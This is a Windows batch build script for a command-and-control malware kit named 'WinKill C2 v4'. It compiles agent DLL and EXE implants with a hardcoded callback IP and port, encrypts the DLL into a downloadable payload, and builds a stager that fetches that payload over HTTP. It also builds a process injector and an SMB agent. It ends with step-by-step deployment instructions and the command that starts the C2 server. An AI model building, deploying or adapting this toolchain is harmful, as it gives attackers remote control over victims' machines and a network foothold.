@echo off
cd /d "%~dp0"

set C2_IP=192.168.102.167
set C2_PORT=4444
set HTTP_IP=192.168.102.167
set HTTP_PORT=8080

if not "%1"=="" set C2_IP=%1
if not "%2"=="" set C2_PORT=%2
if not "%3"=="" set HTTP_IP=%3
if not "%4"=="" set HTTP_PORT=%4

echo import socket,struct > _tmp.py
echo print(hex(struct.unpack('^<I',socket.inet_aton('%C2_IP%'))[0])) >> _tmp.py
for /f %%i in ('python _tmp.py') do set IPHEX=%%i
del _tmp.py

echo ============================================
echo   WinKill C2 v4 Builder
echo   C2: %C2_IP%:%C2_PORT%  HTTP: %HTTP_IP%:%HTTP_PORT%
echo ============================================

echo [1/6] agent.dll...
gcc -O2 -s -m64 -shared -fno-ident -DC2_IP=%IPHEX% -DC2_PORT=%C2_PORT% -o agent.dll agent_source.c -lws2_32 -lwldap32 -ladvapi32 -lnetapi32 || goto :err

echo [2/6] agent.exe...
gcc -O2 -s -m64 -fno-ident -DC2_IP=%IPHEX% -DC2_PORT=%C2_PORT% -o agent.exe agent_exe_source.c -lws2_32 -lwldap32 -ladvapi32 -lnetapi32 || goto :err

echo [3/6] encrypt.exe + payload.bin...
gcc -O2 -s -m64 -fno-ident -o encrypt.exe encrypt_source.c || goto :err
.\encrypt.exe agent.dll || goto :err
copy /Y agent.dll.enc payload.bin >nul 2>&1

echo [4/6] stager.exe...
echo #define DEFAULT_URL_HOST "%HTTP_IP%" > _stager_cfg.h
echo #define DEFAULT_URL_PORT "%HTTP_PORT%" >> _stager_cfg.h
gcc -O2 -s -m64 -fno-ident -o stager.exe stager.c -lwinhttp || goto :err
del _stager_cfg.h

echo [5/6] injector_enc.exe...
gcc -O2 -s -m64 -fno-ident -o injector_enc.exe injector_enc_source.c || goto :err

echo [6/6] agent_smb.exe...
gcc -O2 -s -m64 -fno-ident -o agent_smb.exe agent_smb_source.c -lws2_32 -lwldap32 -ladvapi32 -lnetapi32 || goto :err

echo.
echo ============================================
echo   Build Complete!
echo ============================================
echo.
echo   Usage: build.bat [C2_IP] [C2_PORT] [HTTP_IP] [HTTP_PORT]
echo.
echo   Examples:
echo     build.bat 10.0.0.1 4444 10.0.0.1 8080
echo     build.bat 192.168.1.1 443
echo.
echo   Deploy:
echo     1. Host payload.bin on HTTP server (port %HTTP_PORT%)
echo     2. Run stager.exe (no args needed - URL baked in)
echo     3. agent.exe or injector_enc.exe for other methods
echo.
echo   Server: python c2_server.py 0.0.0.0 %C2_PORT%
echo.
goto :end

:err
echo BUILD FAILED!
:end
